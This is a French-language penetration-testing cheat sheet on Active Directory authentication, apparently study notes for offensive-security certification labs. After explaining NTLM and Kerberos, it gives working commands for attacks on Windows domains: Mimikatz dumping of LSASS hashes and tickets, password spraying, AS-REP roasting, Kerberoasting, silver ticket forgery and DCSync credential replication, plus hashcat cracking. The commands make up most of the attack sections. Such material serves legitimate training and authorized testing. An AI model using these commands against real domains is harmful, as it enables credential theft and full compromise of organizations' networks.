# Authentification

## Théorie

### NTLM

Utilisé quand :
- Authentification par **IP** (pas par hostname)
- Hostname non enregistré dans le DNS AD
- Application tierce qui ne supporte pas Kerberos

**Flux d'authentification (7 étapes)**

1. Le client calcule le **hash NTLM** depuis le mot de passe
2. Le client envoie le **username** au serveur
3. Le serveur renvoie un **nonce** (valeur aléatoire = challenge)
4. Le client chiffre le nonce avec le hash NTLM → **response**
5. Le serveur transfère username + nonce + response au **DC**
6. Le DC chiffre le nonce avec le hash NTLM stocké et compare à la response
7. Si égaux → authentification réussie

![](assets/Pasted%20image%2020260512145336.png)

> NTLM est non-réversible mais rapide à craquer (jusqu'à 600 milliards de hash/s avec GPU haut de gamme). Un mot de passe de 8 caractères peut être cracké en ~2,5h.

### Kerberos

Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tickets** -  le client s'authentifie auprès du **KDC** (Key Distribution Center, rôle tenu par le DC), pas directement auprès du serveur applicatif.

![](assets/Pasted%20image%2020260512145508.png)

| Acronyme | Signification                   |
| -------- | ------------------------------- |
| KDC      | Key Distribution Center         |
| TGT      | Ticket Granting Ticket          |
| AS-REQ   | Authentication Server Request   |
| AS-REP   | Authentication Server Reply     |
| TGS-REQ  | Ticket Granting Service Request |
| TGS-REP  | Ticket Granting Service Reply   |
| AP-REQ   | Application Request             |

**Phase 1 -  Authentification client (AS-REQ / AS-REP)**

1. Le client envoie un **AS-REQ** au DC : timestamp chiffré avec le hash du mot de passe
2. Le DC déchiffre avec le hash stocké dans `ntds.dit` -  si OK, renvoie un **AS-REP** contenant :
   - Une **session key** (chiffrée avec le hash du user)
   - Un **TGT** (Ticket Granting Ticket, chiffré avec le hash du compte `krbtgt` -  le client ne peut pas le lire)

> Le TGT est valide 10h par défaut et se renouvelle sans redemander le mot de passe.

**Phase 2 -  Accès à un service (TGS-REQ / TGS-REP)**

3. Le client envoie un **TGS-REQ** au KDC : username + timestamp chiffrés avec la session key + TGT + nom du service
4. Le KDC vérifie le TGT, extrait la session key, valide le timestamp et l'IP
5. Le KDC renvoie un **TGS-REP** contenant :
   - Un **service ticket** (chiffré avec le hash du compte de service)
   - Une nouvelle session key pour communiquer avec le service

**Phase 3 -  Authentification auprès du service (AP-REQ)**

6. Le client envoie un **AP-REQ** au serveur applicatif : username + timestamp chiffrés avec la session key + service ticket
7. Le serveur déchiffre le ticket avec son propre hash, vérifie le username, lit les groupes → accorde l'accès

### Credentials mis en cache (LSASS)

Les hashes Kerberos (TGT, session keys) et NTLM sont stockés en mémoire dans le processus **LSASS** pour le SSO. Nécessite des droits **SYSTEM ou admin local** pour y accéder.

**Mimikatz -  dump des hashes**

```powershell
# Depuis un PowerShell élevé (admin)
cd C:\Tools
.\mimikatz.exe

privilege::debug                  # activer SeDebugPrivilege
sekurlsa::logonpasswords          # dump NTLM/SHA1 de tous les users connectés
sekurlsa::tickets                 # dump TGT et TGS en mémoire
```

> `sekurlsa::logonpasswords` retourne les hashes NTLM et SHA1. Si WDigest est activé (Windows 7 ou config manuelle), les mots de passe en clair apparaissent aussi.

**Mimikatz -  export/import de tickets Kerberos**

```
sekurlsa::tickets /export          # exporter les tickets sur disque (.kirbi)
kerberos::ptt <TICKET.KIRBI>       # injecter un ticket dans LSASS
```

**Mimikatz -  certificats non-exportables (AD CS)**

```
crypto::capi                       # patcher CryptoAPI pour rendre les clés exportables
crypto::cng                        # patcher le service KeyIso
```

> Activer la **LSA Protection** (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`) bloque la lecture de LSASS par Mimikatz -  bypass couvert dans PEN-300.

## Attaques

### Password Spraying

**Vérifier la politique de verrouillage avant d'attaquer**

```cmd
net accounts
```

Champs clés : `Lockout threshold` (tentatives avant blocage) et `Lockout observation window` (minutes avant réinitialisation du compteur).

> Règle : rester sous le seuil de lockout. Ex: seuil = 5 → max 4 tentatives par user. Avec une fenêtre de 30 min, on peut tenter ~192 passwords/24h sans déclencher de lockout.

**Méthode 1 -  LDAP/ADSI (PowerShell, low and slow)**

```powershell
# Tester un mot de passe pour un user via DirectoryEntry
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$DN  = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString = "LDAP://$PDC/$DN"
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
# Si OK → retourne l'objet. Si KO → exception "username or password is incorrect"
```

```powershell
# Script automatisé (respecte le lockout)
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

**Méthode 2 -  SMB avec NetExec (depuis Kali)**

```bash
nxc smb 'IP' -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

> `[+]` = credentials valides. `(Pwn3d!)` = l'utilisateur est **admin local** sur la cible.
>
> NetExec ne vérifie pas la politique de lockout -  à utiliser avec précaution.

**Méthode 3 -  Kerberos AS-REQ avec kerbrute (furtif, 2 paquets UDP)**

```powershell
# Windows
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

```bash
# Linux
sudo apt update && sudo apt install golang-go --fix-missing
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
go build -o kerbrute .
./kerbrute passwordspray -d corp.com ../users.txt 'Nexus123!' --dc 192.168.193.70
```

> Utilise uniquement AS-REQ/AS-REP -  moins de trafic que SMB, pas de connexion complète établie.

### AS-REP Roasting

Si un compte AD a l'option **"Do not require Kerberos preauthentication"** activée, un attaquant peut demander un AS-REP sans s'authentifier → la réponse contient un hash crackable offline.

**Sans compte AD (liste de usernames requise)**

```bash
# nxc -  tester une liste de users sans mot de passe
nxc ldap 'IP_DC' -u users.txt -p '' --asreproast asreproast.txt --kdcHost 'IP_DC'

# impacket -  même chose
impacket-GetNPUsers -dc-ip 'IP_DC' -no-pass -usersfile users.txt corp.com/ -outputfile hashes.asreproast
```

**Avec un compte AD**

```bash
# Kali -  énumère les users vulnérables ET récupère les hashes
impacket-GetNPUsers -dc-ip 'IP_DC' -outputfile hashes.asreproast corp.com/'USER':'PASSWORD'
```

```powershell
# Windows (PowerView) -  identifier les comptes vulnérables
Get-DomainUser -PreauthNotRequired
```

```powershell
# Windows (Rubeus) -  récupérer les hashes
.\Rubeus.exe asreproast /nowrap
```

**Cracker le hash (mode 18200)**

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

> **Targeted AS-REP Roasting** : si on a `GenericWrite` ou `GenericAll` sur un compte, on peut modifier son `UserAccountControl` pour désactiver la pré-authentification, récupérer le hash, puis remettre la valeur d'origine. En pratique, **Targeted Kerberoasting** est préféré pour le même prérequis -  il suffit d'ajouter un SPN sans toucher au `userAccountControl`.

### Kerberoasting

Attaque sur l'étape **KRB_TGS_REP**. N'importe quel utilisateur du domaine (sans privilèges particuliers) peut demander un service ticket (TGS) pour n'importe quel compte possédant un SPN. Le KDC vérifie la validité du TGT mais **ne vérifie pas les permissions** de l'utilisateur sur le service. Il répond avec un TGS-REP dont une partie est chiffrée avec le hash du compte de service → crackable offline.

> Cible prioritaire : les comptes **utilisateur** avec un SPN (IIS, MSSQL…). Les comptes machine, MSA et gMSA ont des mots de passe aléatoires de 120 caractères -  inutile de les craquer. Même chose pour `krbtgt`.

**Depuis Windows (Rubeus)**

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

**Depuis Kali -  nxc (avec un compte valide)**

```bash
nxc ldap 'IP_DC' -u 'USER' -p 'PASSWORD' --kdcHost 'IP_DC' --kerberoasting kerberoasting.txt
```

**Depuis Kali -  impacket**

```bash
impacket-GetUserSPNs -dc-ip 'IP_DC' corp.com/'USER':'PASSWORD' -outputfile hashes.kerberoast
```

> Erreur `KRB_AP_ERR_SKEW` → synchroniser l'heure avec le DC : `sudo ntpdate <IP_DC>`

**Cracker le hash (mode 13100)**

```bash
hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt
```

#### Kerberoasting via AS-REP Roasting

Si on contrôle un compte AS-REP roastable (sans pré-auth), on peut l'utiliser pour kerberoaster d'autres comptes -  sans avoir besoin d'un vrai mot de passe.

**NetExec**
```bash
# -u : compte AS-REP roastable (pas de pré-auth requise)
# --no-preauth-targets : liste des comptes à kerberoaster
nxc ldap 'IP_DC' -u 'ASREP_USER' -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```

**impacket**
```bash
GetUserSPNs.py -no-preauth <ASREP_USER> -usersfile services.txt -dc-host <IP_DC> <DOMAIN>/
```

**Rubeus**
```powershell
.\Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:<DOMAIN> /dc:<DC_HOST> /nopreauth:<ASREP_USER> /spn:<TARGET_SERVICE>
```

#### Targeted Kerberoasting

Requiert `GenericAll`, `GenericWrite`, `WriteProperty` ou `Validated-SPN` sur la cible. Les membres du groupe **Account Operators** ont généralement ces droits.

**Depuis Kali -  targetedKerberoast.py (recommandé, gère tout automatiquement)**

```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast
targetedKerberoast.py -v -d <DOMAIN> -u <USER> -p <PASSWORD>
```

**Depuis Kali -  manuellement avec nxc**

```bash
# 1. Ajouter un SPN
bloodyAD -d <DOMAIN> --host <IP_DC> -u <USER> -p <PASSWORD> set object <TARGET> servicePrincipalName -v 'HTTP/ANYTHING'

# 2. Kerberoaster
nxc ldap 'IP_DC' -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --kerberoasting kerberoastables.txt

# 3. Cleanup
bloodyAD -d <DOMAIN> --host <IP_DC> -u <USER> -p <PASSWORD> remove object <TARGET> servicePrincipalName -v 'HTTP/ANYTHING'
```

**Depuis Windows -  PowerView**

```powershell
# Vérifier que la cible n'a pas déjà un SPN
Get-DomainUser 'VICTIMUSER' | Select serviceprincipalname

# Ajouter un SPN
Set-DomainObject -Identity 'VICTIMUSER' -Set @{serviceprincipalname='NONEXISTENT/BLAHBLAH'}

# Récupérer le hash
$User = Get-DomainUser 'VICTIMUSER'
$User | Get-DomainSPNTicket | fl

# Cleanup
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```

> Toujours supprimer le SPN après exploitation pour ne pas laisser de vulnérabilité dans l'infra.

### Silver Tickets

Forger un service ticket (TGS) en utilisant le hash NTLM du compte de service. L'application cible vérifie le ticket localement (chiffré avec le hash du service) sans contacter le DC → accès avec les permissions de son choix.

> La validation PAC (optionnelle) est rarement activée sur les services -  l'attaque fonctionne dans la grande majorité des cas.

**Informations requises**

| Élément | Comment l'obtenir |
|---|---|
| Hash NTLM du compte de service | Mimikatz `sekurlsa::logonpasswords` (si session active sur la machine) |
| Domain SID | `whoami /user` → retirer le RID (dernier `-XXXX`) |
| SPN cible | `setspn -L <USER>` ou `Get-NetUser -SPN` |

**Récupérer le hash NTLM du service (Mimikatz)**

```
privilege::debug
sekurlsa::logonpasswords
```

**Obtenir le Domain SID**

```powershell
whoami /user
# ex: S-1-5-21-1987370270-658905905-1781884369-1105
# Domain SID = S-1-5-21-1987370270-658905905-1781884369 (sans le RID final)
```

**Forger et injecter le Silver Ticket (Mimikatz)**

```
kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /target:<SPN_HOST> /service:<PROTOCOL> /rc4:<NTLM_HASH> /user:<USER> /ptt
```

```
# Exemple -  forger un ticket HTTP pour web04 en tant que jeffadmin
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin /ptt
```

> `/ptt` injecte directement le ticket en mémoire. Le module s'appelle `kerberos::golden` mais génère bien un **silver ticket** quand `/service` est spécifié (pas `krbtgt`).

**Vérifier que le ticket est en mémoire**

```powershell
klist
```

**Utiliser le ticket**

```powershell
iwr -UseDefaultCredentials http://web04

# Afficher le contenu complet de la page (source HTML)
(iwr -UseDefaultCredentials http://web04).Content
(iwr -UseDefaultCredentials http://web04).RawContent
```

> Patch Microsoft (octobre 2022) : le champ `PAC_REQUESTOR` doit être validé par le DC si client et KDC sont dans le même domaine -  empêche de forger des tickets pour des users inexistants, mais pas pour des users valides.

### DCSync

Imite un DC pour demander la réplication des credentials d'un utilisateur via l'API `IDL_DRSGetNCChanges` (protocole DRS). Le DC cible ne vérifie pas si la demande vient d'un vrai DC -  seulement que le SID a les droits requis.

**Droits requis** : `Replicating Directory Changes` + `Replicating Directory Changes All`. Par défaut : membres de **Domain Admins**, **Enterprise Admins**, **Administrators**.

**Depuis Windows (Mimikatz)**

```
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
```

**Depuis Kali (impacket-secretsdump)**

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:''PASSWORD''@'IP_DC'

# Dump tous les comptes
impacket-secretsdump corp.com/jeffadmin:''PASSWORD''@'IP_DC'
```

**Depuis Kali (NetExec)**

```bash
nxc smb 'IP_DC' -u ''USER'' -p ''PASSWORD'' --ntds
```

**Cracker le hash NTLM obtenu (mode 1000)**

```bash
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

> Les hashes NTLM obtenus par DCSync peuvent aussi être utilisés directement en **Pass-the-Hash** sans avoir à les craquer (voir Lateral Movement).

